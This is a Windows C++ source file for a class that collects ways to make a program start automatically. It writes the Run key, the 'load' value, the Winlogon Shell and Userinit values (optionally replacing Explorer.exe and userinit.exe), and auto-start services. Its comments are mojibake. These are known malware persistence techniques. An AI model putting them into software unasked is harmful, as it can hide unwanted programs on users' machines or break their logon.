#include ".\startaggregate.h"

CStartAggregate::CStartAggregate(void)
{
	WCHAR szPath[MAX_PATH];
	memset(szPath, 0, sizeof(szPath));
	GetWindowsDirectory(szPath, MAX_PATH);
	if( szPath[lstrlen(szPath) -1] != L'\\')
		lstrcat(szPath, L"\\");
	m_strWindowsPath = szPath;
	memset(szPath, 0, sizeof(szPath));
	GetSystemDirectory(szPath, MAX_PATH);
	if( szPath[lstrlen(szPath) -1] != L'\\')
			lstrcat(szPath, L"\\");
	m_strSystemPath = szPath;
	memset(szPath, 0, sizeof(szPath));
	DWORD dwLen = sizeof(szPath);
	bool bRet = ReadRegisterKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion", L"ProgramFilesDir", szPath, &dwLen);
	if( bRet )
	{
		if( szPath[lstrlen(szPath) -1] != L'\\')
			lstrcat(szPath, L"\\");
		m_strIePath = szPath;
		m_strIePath += L"Internet Explorer\\";
	}
	memset(szPath, 0, sizeof(szPath));
	GetModuleFileName( NULL,  szPath, MAX_PATH);
	m_strExePath = szPath;
	memset(szPath, 0, sizeof(szPath));
	GetTempPath(MAX_PATH, szPath);
	if( szPath[lstrlen(szPath) -1] != L'\\')
		lstrcat(szPath, L"\\");
	m_strTempPath = szPath;
}

CStartAggregate::~CStartAggregate(void)
{
}
HKEY CStartAggregate::OpenRegisterKey(HKEY hKey, LPCWSTR lpSubKey, REGSAM samDesired)
{
	HKEY  hKEY;
	long  ret = RegOpenKeyEx(hKey,lpSubKey, 0, samDesired, &hKEY);
	if(ret!=ERROR_SUCCESS)
	{ 
		RegCloseKey(hKEY);
		return NULL;
	}
	return hKEY;
}
bool CStartAggregate::ReadRegisterKey(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpKey, LPCWSTR lpRet, DWORD* dwRet)
{
	HKEY  hKEY = OpenRegisterKey(hKey, lpSubKey, KEY_READ);
	if(!hKEY)
		return false;
	DWORD dwType = REG_SZ;
	long  ret = RegQueryValueEx(hKEY, lpKey, 0, &dwType, (LPBYTE)lpRet, dwRet);
	RegCloseKey(hKEY);
	if(ret != ERROR_SUCCESS)
		return false;
	return true;
}
bool CStartAggregate::WriteRegisterKey(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpKey, LPCWSTR lpRet, DWORD dwRet)
{
	HKEY  hKEY = OpenRegisterKey(hKey, lpSubKey, KEY_WRITE);
	if(!hKEY)
		return false;
	long  ret = RegSetValueEx(hKEY, lpKey, 0, REG_SZ, (LPBYTE)lpRet, dwRet * sizeof(TCHAR));
	RegCloseKey(hKEY);
	if(ret != ERROR_SUCCESS)
		return false;
	return true;
}

bool CStartAggregate::SetCurrentVersionRun(LPCWSTR szKey, LPCWSTR szVel)
{
	return WriteRegisterKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", szKey, szVel, lstrlen(szVel) );
}
bool CStartAggregate::GetCurrentVersionRun(LPCWSTR szKey, LPWSTR szVel, DWORD dwLen)
{
	bool bRet = ReadRegisterKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", szKey, szVel, &dwLen);
	if(!bRet)
		return false;
	if(lstrlen(szVel) == 0)
		return false;
	return true;
}


bool CStartAggregate::SetCurrentWindowsLoad(LPCWSTR szVel)
{
	return WriteRegisterKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", L"load", szVel, lstrlen(szVel));
}
bool CStartAggregate::GetCurrentWindowsLoad(LPWSTR szVel, DWORD dwLen )
{
	bool bRet =  ReadRegisterKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", L"load", szVel, &dwLen);
	if(!bRet)
		return false;
	if(lstrlen(szVel) == 0)
		return false;
	return true;
}

bool CStartAggregate::SetCurrentVersionWinlogonShell(LPCWSTR szVel, bool bOverlay )
{
	std::wstring strVel;
	if(!bOverlay)
		strVel += L"Explorer.exe ";
	strVel += szVel;
	return WriteRegisterKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", strVel.c_str(), lstrlen(strVel.c_str()));
}

bool CStartAggregate::GetCurrentVersionWinlogonShell(LPWSTR szVel, DWORD dwLen )
{
	bool bRet = ReadRegisterKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", szVel, &dwLen);
	if(!bRet)
		return false;
	if(lstrlen(szVel) == 0)
		return false;
	return true;
}

bool CStartAggregate::SetCurrentVersionWinlogonUserinit(LPCWSTR szVel, bool bOverlay)
{
	std::wstring strVel;
	if(!bOverlay)
		strVel += m_strSystemPath + L"userinit.exe,";
	strVel += szVel;
	return WriteRegisterKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Userinit", strVel.c_str(), lstrlen(strVel.c_str()));
}
bool CStartAggregate::GetCurrentVersionWinlogonUserinit(LPWSTR szVel, DWORD dwLen)
{
	bool bRet = ReadRegisterKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Userinit", szVel, &dwLen);
	if(!bRet)
		return false;
	if(lstrlen(szVel) == 0)
		return false;
	return true;
}
SC_HANDLE CStartAggregate::_OpenSCManager()
{
	return OpenSCManager(
		NULL,//���ػ���
		NULL,//Ĭ�����ݿ�
		SC_MANAGER_ALL_ACCESS //����Ȩ��
		);
}

bool CStartAggregate::_StopServer(SC_HANDLE hServer)
{
	SERVICE_STATUS			ssTelnetStatus;
	DWORD					dwWaitTime;
	BOOL IsSuccess = ControlService(hServer, SERVICE_CONTROL_STOP,&ssTelnetStatus);
	if(IsSuccess)
	{
		dwWaitTime = ssTelnetStatus.dwWaitHint / 10;
		if( dwWaitTime < 1000 )
			dwWaitTime = 1000;
		else if ( dwWaitTime > 10000 )
			dwWaitTime = 10000;
		Sleep(dwWaitTime);
	}
	return true;
}
bool CStartAggregate::_StartServer(LPCWSTR szServiceName)
{
	SC_HANDLE schSCManager = _OpenSCManager();
	if ( schSCManager == NULL )
		return false;
	SC_HANDLE  schService = OpenService(schSCManager, szServiceName, SERVICE_ALL_ACCESS);
	if(!schService)
	{
		CloseServiceHandle(schSCManager);
		return false;
	}
	BOOL bRet = StartService(schService,0,NULL);
	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
	if(bRet)
		return true;
	return false;
}



bool CStartAggregate::CreateNtService(LPCWSTR szServiceName, LPCWSTR szPath)
{
	BOOL bRet = FALSE;
	SC_HANDLE schSCManager = _OpenSCManager();
	if ( schSCManager == NULL )
		return false;
	SC_HANDLE  schService = OpenService(schSCManager, szServiceName, SERVICE_ALL_ACCESS);
	if(schService)
	{
		_StopServer(schService);

		bRet = ChangeServiceConfig(
					schService,//������ƹ����� ���ݿ�
					SERVICE_WIN32_OWN_PROCESS,//��������
					SERVICE_AUTO_START,//�������ͣ���ϵͳ�Զ�//����
					SERVICE_ERROR_NORMAL,
					szPath,
					NULL,
					NULL,
					TEXT(""),
					NULL,//����ϵͳ�ʺ�
					NULL,// û�п���
					L"");
	}
	else
	{
		schService=CreateService(
				schSCManager,//������ƹ����� ���ݿ�
				szServiceName,//��̨��������
				szServiceName,//�ڷ�������������ʾ��//��������
				SERVICE_ALL_ACCESS,//����Ȩ��
				SERVICE_WIN32_OWN_PROCESS,//��������
				SERVICE_AUTO_START,//�������ͣ���ϵͳ�Զ�//����
				SERVICE_ERROR_NORMAL,
				szPath,
				NULL,
				NULL,
				TEXT(""),
				NULL,//����ϵͳ�ʺ�
				NULL);// û�п���
		if(schService) 
			bRet  = TRUE;
	}
	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
	if(bRet)
		return true;
	return false;
}